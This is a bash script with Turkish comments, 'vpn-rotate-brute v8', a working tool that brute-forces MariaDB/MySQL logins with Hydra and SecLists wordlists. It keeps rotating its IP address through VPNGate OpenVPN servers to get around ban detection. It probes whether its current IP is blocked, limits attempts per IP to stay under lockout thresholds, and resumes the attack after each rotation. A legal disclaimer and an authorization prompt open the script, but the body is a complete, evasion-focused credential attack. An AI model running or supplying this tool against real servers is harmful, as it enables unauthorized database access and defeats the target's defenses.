#!/usr/bin/env bash
# =====================================================================
# vpn-rotate-brute v8
# MariaDB brute + VPNGate sürekli rotasyon (LAB / YETKİLİ PENTEST)
#
# ⚠️  YASAL UYARI
# Bu araç SADECE:
#   - Kendi sunucularında
#   - Yazılı izin aldığın sistemlerde
#   - İzole lab ortamlarında (DVWA, Metasploitable, HTB vb.)
# kullanılabilir. Yetkisiz kullanım TCK 243/244, CFAA, CMA 1990
# ve benzeri yasalar kapsamında SUÇTUR.
#
# Kullanım:
#   sudo bash manifest --target <IP> [--port 3306] [--fresh]
#   sudo bash manifest -t 192.168.1.50
#   sudo bash manifest -t 10.10.10.10 --fresh
#
# Durdur: Ctrl+C | Sıfırla: --fresh
# =====================================================================
set -u

# ---------------------------------------------------------------
# Parametreler (target ZORUNLU, hardcode YOK)
# ---------------------------------------------------------------
TARGET=""
PORT="3306"
FRESH=0

usage() {
    cat <<EOF
Kullanım: sudo bash $0 --target <IP> [--port <PORT>] [--fresh]

  -t, --target <IP>   Hedef MariaDB IP'si (ZORUNLU)
  -p, --port <PORT>   Hedef port (varsayılan: 3306)
      --fresh         Önceki restore dosyasını sil, baştan başla
  -h, --help          Bu yardımı göster

Örnek:
  sudo bash $0 --target 192.168.1.50
  sudo bash $0 -t 10.10.10.10 -p 3307 --fresh

⚠️  Sadece YETKİLİ olduğun sistemlerde kullan.
EOF
    exit 0
}

while [ $# -gt 0 ]; do
    case "$1" in
        -t|--target) TARGET="${2:-}"; shift 2 ;;
        -p|--port)   PORT="${2:-}";   shift 2 ;;
        --fresh)     FRESH=1;         shift ;;
        -h|--help)   usage ;;
        *) echo "[!] Bilinmeyen argüman: $1"; usage ;;
    esac
done

if [ -z "$TARGET" ]; then
    echo "[!] HATA: --target zorunlu."
    echo
    usage
fi

# Basit IP/domain doğrulama (kaba ama yeterli)
if ! echo "$TARGET" | grep -qE '^([0-9]{1,3}\.){3}[0-9]{1,3}$|^[a-zA-Z0-9.-]+$'; then
    echo "[!] Geçersiz target: $TARGET"; exit 1
fi

# ---------------------------------------------------------------
# Yetkili kullanım onayı (opsiyonel ama önerilir)
# ---------------------------------------------------------------
if [ "${I_AM_AUTHORIZED:-0}" != "1" ]; then
    echo "============================================================"
    echo " ⚠️  YASAL UYARI"
    echo " Bu araç yalnızca YETKİLİ olduğun sistemlerde kullanılabilir."
    echo " Yetkisiz kullanım suçtur (TCK 243/244, CFAA, CMA 1990)."
    echo "============================================================"
    read -r -p "Yetkili olduğunu onaylıyor musun? (yes/N): " ans
    [ "$ans" = "yes" ] || { echo "[!] İptal."; exit 1; }
fi

# ---------------------------------------------------------------
# Root / HOME
# ---------------------------------------------------------------
if [ "$(id -u)" -eq 0 ]; then
    if [ -n "${SUDO_USER:-}" ]; then
        HOME="$(getent passwd "$SUDO_USER" | cut -d: -f6)"
    elif [ -n "${ORIG_HOME:-}" ]; then
        HOME="$ORIG_HOME"
    fi
else
    exec sudo -E env ORIG_HOME="$HOME" I_AM_AUTHORIZED="${I_AM_AUTHORIZED:-0}" bash "$0" "$@"
fi

DESKTOP="$HOME/Desktop"
WORK="$DESKTOP/rotate"
OVPN_DIR="$WORK/ovpn"
MANUAL_DIR="$WORK/manual"
LOG="$WORK/hydra.log"
RESTORE="$WORK/hydra.restore"
CREDS="$WORK/vpngate.creds"
SEEN_IPS="$WORK/seen_ips.txt"

echo "[*] Target: $TARGET:$PORT"

# ---------------------------------------------------------------
# SecLists
# ---------------------------------------------------------------
SECLISTS=""
for p in "$DESKTOP/SecLists" "$DESKTOP/seclists" "$DESKTOP/SecLists-master" /usr/share/seclists; do
    [ -d "$p" ] && { SECLISTS="$p"; break; }
done
[ -z "$SECLISTS" ] && { echo "[!] SecLists yok"; exit 1; }
echo "[*] SecLists: $SECLISTS"

pick_list() {
    local dir="$1"; shift
    for f in "$@"; do
        [ -s "$dir/$f" ] && { echo "$dir/$f"; return 0; }
    done
    return 1
}

USERLIST=$(pick_list "$SECLISTS/Usernames" top-usernames-shortlist.txt xato-net-10-million-usernames.txt)
PASSLIST=$(pick_list "$SECLISTS/Passwords/Common-Credentials" \
    best1050.txt 10k-most-common.txt \
    10-million-password-list-top-1000.txt 10-million-password-list-top-100.txt)

if [ -z "$USERLIST" ] || [ -z "$PASSLIST" ]; then
    echo "[!] wordlist yok"; exit 1
fi
echo "[*] User: $USERLIST"
echo "[*] Pass: $PASSLIST"
echo "[*] Kombi: $(( $(wc -l < "$USERLIST") * $(wc -l < "$PASSLIST") ))"

for bin in hydra mysql openvpn curl base64 awk tail shuf; do
    command -v "$bin" >/dev/null || { echo "[!] $bin yok"; exit 1; }
done

# ---------------------------------------------------------------
# Sabitler
# ---------------------------------------------------------------
ATTEMPT_BUDGET=10
WAIT_BETWEEN=3
RESTART_MAX=15
STALL_SECS=60
VPNGATE_API="https://www.vpngate.net/api/iphone/"
MAX_BATCHES=0

mkdir -p "$WORK" "$OVPN_DIR" "$MANUAL_DIR"
cd "$WORK" || exit 1
printf 'vpn\nvpn\n' > "$CREDS"
touch "$SEEN_IPS" "$LOG"
chmod 600 "$CREDS" "$LOG" "$SEEN_IPS" 2>/dev/null

if [ "$FRESH" -eq 1 ]; then
    echo "[*] --fresh: restore silindi"
    rm -f "$RESTORE"
elif [ -f "$RESTORE" ]; then
    echo "[*] Mevcut restore bulundu, kaldığı yerden devam: $RESTORE"
else
    echo "[*] Restore yok, baştan başlanıyor"
fi

TAILPID=""
cleanup() {
    [ -n "${TAILPID:-}" ] && kill "$TAILPID" 2>/dev/null
    pkill -f "openvpn --config $OVPN_DIR" 2>/dev/null
    rm -rf "$OVPN_DIR" "$CREDS" "$WORK/b64list.txt" "$WORK/vpngate.raw" "$WORK/vg.html" "$WORK/ovpn_urls.txt"
    echo
    echo "[*] Çıkış. Toplam: ${TOTAL:-0} | Batch: ${BATCH_NUM:-0}"
    [ -f "$RESTORE" ] && echo "[*] Restore korundu: $RESTORE"
}
trap cleanup EXIT INT TERM

# ---------------------------------------------------------------
# Yardımcılar
# ---------------------------------------------------------------
get_ip() {
    local ip url
    for url in ifconfig.me icanhazip.com ipinfo.io/ip api.ipify.org; do
        ip=$(curl -4 -s --max-time 5 "$url" 2>/dev/null \
             | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -1)
        [ -n "$ip" ] && { echo "$ip"; return; }
    done
    echo "?"
}

ip_seen() {
    [ -n "$1" ] && [ "$1" != "?" ] && grep -qxF "$1" "$SEEN_IPS" 2>/dev/null
}
mark_ip() {
    [ -n "$1" ] && [ "$1" != "?" ] && ! ip_seen "$1" && echo "$1" >> "$SEEN_IPS"
}

# ---------------------------------------------------------------
# VPNGate fetch zinciri
# ---------------------------------------------------------------
fetch_vpngate_configs() {
    echo "[*] VPNGate API indiriliyor..."
    rm -rf "$OVPN_DIR"; mkdir -p "$OVPN_DIR"
    local raw="$WORK/vpngate.raw"
    : > "$raw"

    if ! curl -4 -sSL --max-time 30 -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
            "$VPNGATE_API" -o "$raw" 2>/dev/null; then
        echo "[!] İlk deneme fail, -k ile tekrar..."
        curl -4 -skSL --max-time 30 -A "Mozilla/5.0" "$VPNGATE_API" -o "$raw" 2>/dev/null \
            || { echo "[!] API erişilemedi"; rm -f "$raw"; return 1; }
    fi

    local size; size=$(wc -c < "$raw" 2>/dev/null || echo 0)
    echo "[*] Ham yanıt: $size byte"
    if [ "$size" -lt 1000 ]; then
        echo "[!] Yanıt çok küçük"; head -c 300 "$raw"; echo
        rm -f "$raw"; return 1
    fi

    awk -F',' '$0 !~ /^\*/ && NF>=15 {print $15}' "$raw" \
        | tr -d '\r' | grep -v '^$' | shuf > "$WORK/b64list.txt"

    local idx=0
    while IFS= read -r b64 && [ "$idx" -lt "$RESTART_MAX" ]; do
        [ -z "$b64" ] && continue
        local conf="$OVPN_DIR/conf_${idx}.ovpn"
        if ! echo "$b64" | base64 -d > "$conf" 2>/dev/null; then
            rm -f "$conf"; continue
        fi
        local rip
        rip=$(grep -E '^remote ' "$conf" 2>/dev/null | awk '{print $2}' | head -1)
        if [ -n "$rip" ] && ip_seen "$rip"; then rm -f "$conf"; continue; fi
        idx=$((idx + 1))
    done < "$WORK/b64list.txt"

    rm -f "$raw" "$WORK/b64list.txt"
    echo "[*] API'den $idx config"
    [ "$idx" -gt 0 ]
}

fetch_vpngate_web() {
    echo "[*] Yedek: VPNGate web sayfası..."
    local page="$WORK/vg.html"
    curl -4 -skSL --max-time 30 -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
        "https://www.vpngate.net/en/" -o "$page" 2>/dev/null || return 1

    grep -oE 'href="[^"]+\.ovpn"' "$page" | sed 's/^href="//; s/"$//' \
        | sort -u | shuf > "$WORK/ovpn_urls.txt"

    local n=0 url
    while IFS= read -r url && [ "$n" -lt "$RESTART_MAX" ]; do
        [ -z "$url" ] && continue
        case "$url" in
            http*) ;;
            /*) url="https://www.vpngate.net$url" ;;
            *) url="https://www.vpngate.net/$url" ;;
        esac
        curl -4 -skSL --max-time 20 "$url" -o "$OVPN_DIR/conf_${n}.ovpn" 2>/dev/null \
            && grep -q '^client' "$OVPN_DIR/conf_${n}.ovpn" 2>/dev/null && n=$((n + 1))
    done < "$WORK/ovpn_urls.txt"

    rm -f "$page" "$WORK/ovpn_urls.txt"
    echo "[*] Web'den $n config"
    [ "$n" -gt 0 ]
}

use_manual_if_present() {
    if ls "$MANUAL_DIR"/*.ovpn >/dev/null 2>&1; then
        rm -rf "$OVPN_DIR"; mkdir -p "$OVPN_DIR"
        local i=0 f
        for f in "$MANUAL_DIR"/*.ovpn; do
            cp "$f" "$OVPN_DIR/conf_${i}.ovpn" && i=$((i + 1))
        done
        echo "[*] Manuel config: $i adet"
        return 0
    fi
    return 1
}

fetch_batch() {
    use_manual_if_present && return 0
    fetch_vpngate_configs && return 0
    fetch_vpngate_web && return 0
    echo "[!] VPNGate erişimi yok"
    return 1
}

vpn_connect() {
    local cfg="$1" old="$2"
    pkill -f "openvpn --config $OVPN_DIR" 2>/dev/null; sleep 2
    sed -i "s|^auth-user-pass.*|auth-user-pass $CREDS|" "$cfg"
    grep -q '^auth-user-pass' "$cfg" || echo "auth-user-pass $CREDS" >> "$cfg"

    openvpn --config "$cfg" --daemon --log "$WORK/vpn.log" --writepid "$WORK/vpn.pid" \
        --connect-retry 1 --connect-timeout 15 --tls-timeout 15 --auth-nocache >/dev/null 2>&1

    local ip i
    for i in $(seq 1 25); do
        sleep 2
        ip=$(get_ip)
        if [ -n "$ip" ] && [ "$ip" != "?" ]; then
            if [ -z "$old" ] || [ "$old" = "?" ] || [ "$ip" != "$old" ]; then
                echo "$ip"; return 0
            fi
        fi
    done
    return 1
}

probe_banned() {
    timeout 8 mysql -h "$TARGET" -P "$PORT" -u root --connect-timeout=5 -e "SELECT 1;" 2>&1 \
        | grep -qi "blocked"
}
probe_auth() {
    timeout 8 mysql -h "$TARGET" -P "$PORT" -u root --connect-timeout=5 -e "SELECT 1;" 2>&1 \
        | grep -qE "1045|1130|Access denied|Host .* is not allowed"
}
count_attempts() {
    local n; n=$(grep -c '\[ATTEMPT\]' "$LOG" 2>/dev/null)
    echo "${n:-0}"
}

# ================= ANA DÖNGÜ =================
TOTAL=0
BATCH_NUM=0
EMPTY=0

echo "[*] 15 VPN bitince yeni batch (MAX_BATCHES=$MAX_BATCHES, 0=sonsuz)"
echo "[*] Durdur: Ctrl+C | Sıfırla: --fresh"
echo

while true; do
    BATCH_NUM=$((BATCH_NUM + 1))
    if [ "$MAX_BATCHES" -gt 0 ] && [ "$BATCH_NUM" -gt "$MAX_BATCHES" ]; then
        echo "[*] MAX_BATCHES doldu. Toplam: $TOTAL"; exit 0
    fi

    echo
    echo "############################################################"
    echo "# BATCH $BATCH_NUM | Toplam: $TOTAL | IP: $(wc -l < "$SEEN_IPS" 2>/dev/null || echo 0)"
    echo "# Target: $TARGET:$PORT"
    echo "############################################################"

    if ! fetch_batch; then
        EMPTY=$((EMPTY + 1))
        echo "[!] Batch indirilemedi ($EMPTY/5) - 30 sn"
        [ "$EMPTY" -ge 5 ] && { echo "[!] 5 fail, çıkılıyor"; exit 1; }
        sleep 30; continue
    fi
    EMPTY=0

    mapfile -t CONF_LIST < <(printf '%s\n' "$OVPN_DIR"/conf_*.ovpn | shuf)

    ROUND=0
    for cfg in "${CONF_LIST[@]}"; do
        [ -f "$cfg" ] || continue
        ROUND=$((ROUND+1))
        echo
        echo "================ Batch $BATCH_NUM | Tur $ROUND/${#CONF_LIST[@]} ================"
        echo "[*] VPN: $(basename "$cfg")"

        OLD_IP=$(get_ip)
        echo "[*] Eski IP: $OLD_IP"
        NEW_IP=$(vpn_connect "$cfg" "$OLD_IP") || { echo "[!] VPN/IP alınamadı"; continue; }
        echo "[+] Yeni IP: $NEW_IP"

        if ip_seen "$NEW_IP"; then
            echo "[!] Bu çıkış IP denendi, atla"; continue
        fi
        mark_ip "$NEW_IP"
        rip=$(grep -E '^remote ' "$cfg" 2>/dev/null | awk '{print $2}' | head -1)
        [ -n "$rip" ] && mark_ip "$rip"

        echo "[*] Ban kontrolü..."
        probe_banned && { echo "[!] BANLI"; continue; }
        echo "[*] 3306 kontrolü..."
        if ! probe_auth; then
            echo "[!] 3306 yok (timeout/filter)"
            tail -5 "$WORK/vpn.log"; continue
        fi
        echo "[+] 3306 OK"

        : > "$LOG"
        if [ -f "$RESTORE" ]; then
            echo "[*] hydra -R (restore ile devam)..."
            hydra -R -V -F > "$LOG" 2>&1 &
        else
            echo "[*] hydra başlıyor..."
            hydra -L "$USERLIST" -P "$PASSLIST" -t 1 -W "$WAIT_BETWEEN" -V -F \
                mysql://"$TARGET":"$PORT" > "$LOG" 2>&1 &
        fi
        HPID=$!

        tail -n 0 -f "$LOG" & TAILPID=$!
        START_TS=$(date +%s); LAST_CNT=0; KILL_REASON=""

        while kill -0 "$HPID" 2>/dev/null; do
            if grep -qi "valid password found" "$LOG"; then
                kill -INT "$HPID" 2>/dev/null; wait "$HPID" 2>/dev/null
                kill "$TAILPID" 2>/dev/null; wait "$TAILPID" 2>/dev/null; TAILPID=""
                echo "[+] BAŞARILI!"
                grep -iE "login|password|host:" "$LOG" | tail -8
                rm -f "$RESTORE"
                exit 0
            fi
            if grep -qi "blocked because of many connection errors" "$LOG"; then
                KILL_REASON="ban"
                kill -INT "$HPID" 2>/dev/null; wait "$HPID" 2>/dev/null
                echo "[!] IP banlandı -> devir (restore KORUNUR)"; break
            fi
            cnt=$(count_attempts)
            if [ "$cnt" -ge "$ATTEMPT_BUDGET" ]; then
                KILL_REASON="budget"
                kill -INT "$HPID" 2>/dev/null; wait "$HPID" 2>/dev/null
                echo "[*] Bütçe doldu ($cnt) (restore KORUNUR)"; break
            fi
            now=$(date +%s)
            if [ "$cnt" -eq 0 ] && [ $((now - START_TS)) -ge "$STALL_SECS" ]; then
                KILL_REASON="stall"
                kill -INT "$HPID" 2>/dev/null; wait "$HPID" 2>/dev/null
                echo "[!] $STALL_SECS sn 0 deneme (restore KORUNUR)"; tail -5 "$LOG"; break
            fi
            if [ "$cnt" -gt "$LAST_CNT" ]; then LAST_CNT=$cnt; START_TS=$now; fi
            sleep 2
        done

        kill "$TAILPID" 2>/dev/null; wait "$TAILPID" 2>/dev/null; TAILPID=""
        wait "$HPID" 2>/dev/null
        cnt=$(count_attempts)
        TOTAL=$((TOTAL + cnt))
        echo "[*] Tur: $cnt | Toplam: $TOTAL"

        # FIX: restore sadece hydra doğal biterse silinir
        if [ -z "$KILL_REASON" ]; then
            echo "[*] Hydra doğal bitti, restore siliniyor"
            rm -f "$RESTORE"
        else
            echo "[*] Kill: $KILL_REASON -> restore korundu"
        fi
    done

    echo
    echo "[*] Batch $BATCH_NUM bitti. Toplam: $TOTAL"
    echo "[*] Yeni VPN listesi..."
    sleep 5
done